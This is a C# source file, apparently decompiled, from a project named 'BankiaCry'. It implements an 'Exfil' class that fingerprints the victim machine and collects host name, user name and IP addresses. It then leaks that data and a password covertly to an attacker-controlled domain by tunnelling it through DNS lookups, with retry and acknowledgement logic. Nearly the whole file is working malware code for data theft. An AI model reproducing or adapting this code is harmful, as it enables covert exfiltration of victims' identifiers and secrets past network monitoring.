using System;
using System.Collections.Generic;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace BankiaCry;

internal class Exfil
{
	public ManagementObjectCollection HWID { get; set; }

	public string HostName { get; set; }

	public IPAddress[] HostIP { get; set; }

	public string Uname { get; set; }

	public string machineIdentifier { get; set; }

	private Dictionary<byte[], DNSStream> notCompletedDNSStreams { get; set; }

	private Dictionary<byte[], DNSStream> CompletedDNSStreams { get; set; }

	private HashSet<byte[]> _existingStreams { get; set; }

	public Exfil()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		machineIdentifier = "";
		foreach (string hWIDQuery in Config.GetHWIDQueries())
		{
			ManagementObjectEnumerator enumerator2 = new ManagementObjectSearcher(hWIDQuery).Get().GetEnumerator();
			try
			{
				while (enumerator2.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator2.get_Current();
					PropertyDataEnumerator enumerator3 = ((ManagementBaseObject)val).get_Properties().GetEnumerator();
					try
					{
						while (enumerator3.MoveNext())
						{
							PropertyData current2 = enumerator3.get_Current();
							Console.Write(current2.get_Value());
							machineIdentifier += current2.get_Value();
						}
					}
					finally
					{
						if (enumerator3 is IDisposable disposable)
						{
							disposable.Dispose();
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator2)?.Dispose();
			}
		}
		HostName = Dns.GetHostName();
		Uname = Environment.UserName;
		HostIP = Dns.GetHostAddresses(HostName);
		_existingStreams = new HashSet<byte[]>();
		notCompletedDNSStreams = new Dictionary<byte[], DNSStream>(new ByteArrayComparer());
		CompletedDNSStreams = new Dictionary<byte[], DNSStream>(new ByteArrayComparer());
	}

	private DNSPacket GenerateDataIPacket(byte[] track_id, ushort packet_count)
	{
		List<string> list = new List<string>();
		list.Add(machineIdentifier);
		return new DNSPacket(track_id, list, packet_count, DNSInfo.PacketType.DATA_I, Config.GetDomain());
	}

	private bool ExfiltrateInfo(byte[] info, DNSInfo.PacketType packetType)
	{
		bool flag = false;
		DNSStream dNSStream = new DNSStream(info, Config.GetDomain(), packetType, _existingStreams);
		notCompletedDNSStreams.Add(dNSStream._trckID, dNSStream);
		DNSPacket dNSPacket = GenerateDataIPacket(dNSStream._trckID, (ushort)dNSStream.PacketStream.Count);
		try
		{
			if (ParseDNSResponse(Dns.GetHostEntry(dNSPacket.ToString())))
			{
				int num = 0;
				int num2 = 0;
				while (!dNSStream.ImDone() && num2 < 5)
				{
					IPHostEntry hostEntry = Dns.GetHostEntry(dNSStream.PacketStream[num].ToString());
					if (ParseDNSResponse(hostEntry))
					{
						num++;
						dNSStream.OneMoreCompleted();
					}
					else
					{
						num2++;
					}
				}
				if (num2 == 5)
				{
					return false;
				}
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private bool ParseDNSResponse(IPHostEntry response)
	{
		string[] array = response.HostName.Split(new char[1] { '.' });
		string text = array[0];
		byte[] bytes = Encoding.UTF8.GetBytes(array[1]);
		if (text.ToLower() == DNSInfo.PacketType.POOK.ToString().ToLower() || text.ToLower() == DNSInfo.PacketType.SOOK.ToString().ToLower())
		{
			return true;
		}
		if (text == DNSInfo.PacketType.WTFP.ToString())
		{
			int packetNumber = int.Parse(array[2]);
			ParseDNSResponse(SendPacket(bytes, packetNumber));
			return false;
		}
		return false;
	}

	private IPHostEntry SendPacket(byte[] trackID, int packetNumber)
	{
		DNSPacket dNSPacket = notCompletedDNSStreams[trackID].PacketStream[packetNumber];
		IPHostEntry result = null;
		try
		{
			result = Dns.GetHostEntry(dNSPacket.ToString());
		}
		catch (SocketException)
		{
		}
		return result;
	}

	public bool ExfiltratePass(byte[] info)
	{
		return ExfiltrateInfo(info, DNSInfo.PacketType.PASS);
	}
}
